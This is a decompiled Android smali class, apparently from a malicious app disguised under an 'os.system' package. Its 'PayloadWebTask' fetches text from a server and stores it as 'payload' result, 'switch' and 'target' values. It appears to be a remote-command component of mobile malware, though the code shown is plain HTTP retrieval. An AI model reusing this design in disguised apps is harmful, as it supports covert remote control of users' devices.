.class Los/system/System$PayloadWebTask;
.super Landroid/os/AsyncTask;
.source "System.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/System;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "PayloadWebTask"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field protected applicationContext:Landroid/content/Context;

.field protected paymain:Ljava/lang/String;

.field final synthetic this$0:Los/system/System;


# direct methods
.method private constructor <init>(Los/system/System;)V
    .locals 1

    .prologue
    .line 639
    iput-object p1, p0, Los/system/System$PayloadWebTask;->this$0:Los/system/System;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 642
    const-string v0, ""

    iput-object v0, p0, Los/system/System$PayloadWebTask;->paymain:Ljava/lang/String;

    return-void
.end method

.method synthetic constructor <init>(Los/system/System;Los/system/System$1;)V
    .locals 0

    .prologue
    .line 639
    invoke-direct {p0, p1}, Los/system/System$PayloadWebTask;-><init>(Los/system/System;)V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 639
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Los/system/System$PayloadWebTask;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    .prologue
    const v2, 0xc350

    .line 649
    const-string v0, ""

    .line 650
    new-instance v1, Lorg/apache/http/params/BasicHttpParams;

    invoke-direct {v1}, Lorg/apache/http/params/BasicHttpParams;-><init>()V

    .line 651
    invoke-static {v1, v2}, Lorg/apache/http/params/HttpConnectionParams;->setConnectionTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 652
    invoke-static {v1, v2}, Lorg/apache/http/params/HttpConnectionParams;->setSoTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 654
    new-instance v2, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v2, v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>(Lorg/apache/http/params/HttpParams;)V

    .line 655
    new-instance v1, Lorg/apache/http/client/methods/HttpGet;

    const/4 v3, 0x0

    aget-object v3, p1, v3

    invoke-direct {v1, v3}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 657
    :try_start_0
    invoke-interface {v2, v1}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v1

    .line 659
    :try_start_1
    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v1

    .line 660
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 661
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 663
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_0

    .line 664
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 668
    :catch_0
    move-exception v1

    .line 669
    :try_start_2
    sget-object v1, Los/system/System;->TAG:Ljava/lang/String;

    const-string v2, "Error split text"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 675
    :goto_1
    return-object v0

    .line 666
    :cond_0
    :try_start_3
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 667
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    move-result-object v0

    goto :goto_1

    .line 672
    :catch_1
    move-exception v1

    .line 673
    sget-object v1, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "payload Failed Connect to Server!: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Los/system/System$PayloadWebTask;->this$0:Los/system/System;

    invoke-static {v3}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    sget v3, Los/system/ReceiverBoot;->iserver:I

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 639
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Los/system/System$PayloadWebTask;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 681
    iget-object v0, p0, Los/system/System$PayloadWebTask;->paymain:Ljava/lang/String;

    const-string v1, "text"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 682
    sput-object p1, Los/system/System;->payloadWebResult:Ljava/lang/String;

    .line 690
    :cond_0
    :goto_0
    return-void

    .line 684
    :cond_1
    iget-object v0, p0, Los/system/System$PayloadWebTask;->paymain:Ljava/lang/String;

    const-string v1, "sw"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 685
    sput-object p1, Los/system/System;->payloadWebResultSwitch:Ljava/lang/String;

    goto :goto_0

    .line 687
    :cond_2
    iget-object v0, p0, Los/system/System$PayloadWebTask;->paymain:Ljava/lang/String;

    const-string v1, "target"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 688
    sput-object p1, Los/system/System;->payloadWebResultTarget:Ljava/lang/String;

    goto :goto_0
.end method

.method protected onPreExecute()V
    .locals 0

    .prologue
    .line 645
    return-void
.end method
